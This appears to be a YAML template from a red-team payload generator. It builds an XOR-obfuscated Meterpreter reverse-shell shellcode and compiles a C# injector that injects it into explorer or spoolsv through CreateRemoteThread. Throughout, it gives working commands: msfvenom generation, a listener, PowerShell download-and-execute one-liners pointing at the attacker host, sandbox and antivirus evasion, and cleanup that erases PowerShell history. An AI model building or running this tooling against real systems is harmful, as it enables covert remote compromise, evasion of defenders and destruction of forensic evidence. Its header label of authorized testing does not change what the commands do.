meta:
  name: "Remote Process Injector, XOR (C#)"
  category: "Process Injection"
  description: |
    Generates XOR-encrypted shellcode and performs classic remote process injection.

    Features:
    - XOR encryption for basic obfuscation (key: 0xfa)
    - NUMA-based sandbox detection
    - Automatic target selection based on privilege level
    - Classic CreateRemoteThread injection technique

    The injector opens a target process, allocates executable memory, writes
    the decoded shellcode, and creates a remote thread to execute it.

    WARNING: For authorized security testing only!

  effectiveness: medium

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"

  artifacts:
    - "OpenProcess API calls with PROCESS_ALL_ACCESS"
    - "VirtualAllocEx with PAGE_EXECUTE_READWRITE permissions"
    - "WriteProcessMemory API calls"
    - "CreateRemoteThread API calls"
    - "Network connection to C2 server"
    - "Suspicious memory regions in target process"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "default_target"
    type: "string"
    description: "Default target process for non-elevated execution"
    required: false
    default: "explorer"

  - name: "elevated_target"
    type: "string"
    description: "Target process when running with administrative privileges"
    required: false
    default: "spoolsv"

  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "injector.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
    output_var: "raw_shellcode"

  # Step 2: XOR encrypt the shellcode
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 3: Format encrypted shellcode as C# byte array
  - type: "script"
    name: "format_payload"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "csharp_payload"

output:
  type: "template"
  template: "process_injection/xor_remote_inject.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
  launch_instructions: |
    Remote Process Injector, XOR - Launch Instructions

    Start Listener:
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    In-Memory Execution:
    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [Program]::Main('explorer'.Split())"

    Traditional Execution (File-Based):
    python3 -m http.server 8080
    On target: powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} notepad"

    Notes:
    - XOR encrypted with key: 0x{{ xor_key }} (basic AV evasion)
    - NUMA-based sandbox detection (fails on sandboxes without NUMA support)
    - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal user)
    - Can specify custom target process as argument (e.g., notepad, explorer, chrome)
    - Uses VirtualAllocEx to allocate RWX memory in target process
    - WriteProcessMemory copies XOR-decrypted shellcode to target
    - CreateRemoteThread executes payload in target process
    - EXITFUNC=thread ensures clean exit without crashing target process
    - Reverse shell connects to {{ lhost }}:{{ lport }}
    - Requires matching architecture (x64 payload â†’ x64 process)
    - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection

    Troubleshooting:
    - Injection fails: Verify target process running with `Get-Process notepad` or `tasklist | findstr notepad`
    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
    - Access Denied: May need administrative privileges for certain targets (system processes)
    - Process crashes: Verify x64 payload for x64 process; check shellcode compatibility
    - AV blocks: XOR weak; consider AES or additional obfuscation/packing
    - NUMA check fails: Some VMs/sandboxes don't support NUMA; tool will exit

    Cleanup:
    On target:
    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
